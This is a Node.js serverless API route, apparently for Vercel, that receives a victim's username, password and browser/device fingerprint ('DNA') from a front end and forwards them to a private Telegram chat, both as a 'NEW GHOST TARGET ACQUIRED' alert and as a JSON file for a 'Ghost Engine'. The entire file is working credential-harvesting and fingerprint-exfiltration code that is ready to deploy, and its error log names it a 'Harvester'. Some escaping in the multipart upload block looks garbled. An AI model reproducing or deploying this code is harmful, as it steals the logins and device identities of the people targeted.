const fetch = require('node-fetch');

// This API route receives the DNA from the frontend and pushes it straight to your Private Telegram.
module.exports = async (req, res) => {
    // ⚠️ Configure these before deploying to Vercel
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE';
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || 'YOUR_CHAT_ID_HERE';

    // Must allow CORS so the frontend can send the data
    res.setHeader('Access-Control-Allow-Credentials', true);
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
    res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method === 'POST') {
        try {
            const data = req.body;
            
            // Format the highly detailed alert for Telegram
            const message = `
🎯 **NEW GHOST TARGET ACQUIRED** 🎯
━━━━━━━━━━━━━━━━━━━━━━
👤 **User:** \`${data.username}\`
🔑 **Pass:** \`${data.password}\`
━━━━━━━━━━━━━━━━━━━━━━
🤖 **Device ID:** \`${data.dna.deviceId}\` 
🔄 **Signups from this Phone:** \`${data.dna.lifetimeSignups}\`
📱 **Hardware:** ${data.dna.isMobile ? 'Mobile' : 'Desktop'}
🖥️ **OS/Browser:** \`${data.dna.userAgent.substring(0, 40)}...\`
🎮 **GPU:** \`${data.dna.gpuRenderer}\`
━━━━━━━━━━━━━━━━━━━━━━
Please download the attached DNA JSON file and import it into the Ghost Engine.
`;
            
            // 1. Send the text alert to Telegram
            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });

            // 2. Send the actual DNA Payload as a clean .json document
            const boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW';
            let blobContent = \`--\${boundary}\\r\\nContent-Disposition: form-data; name="chat_id"\\r\\n\\r\\n\${TELEGRAM_CHAT_ID}\\r\\n--\${boundary}\\r\\nContent-Disposition: form-data; name="document"; filename="\${data.username}_dna.json"\\r\\nContent-Type: application/json\\r\\n\\r\\n\${JSON.stringify(data.dna, null, 2)}\\r\\n--\${boundary}--\\r\\n\`;
            
            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
                method: 'POST',
                headers: {
                    'Content-Type': \`multipart/form-data; boundary=\${boundary}\`
                },
                body: blobContent
            });

            return res.status(200).json({ success: true });
        } catch (error) {
            console.error('Harvester Error:', error);
            return res.status(500).json({ error: 'Internal Server Error' });
        }
    }

    return res.status(405).json({ error: 'Method Not Allowed' });
};
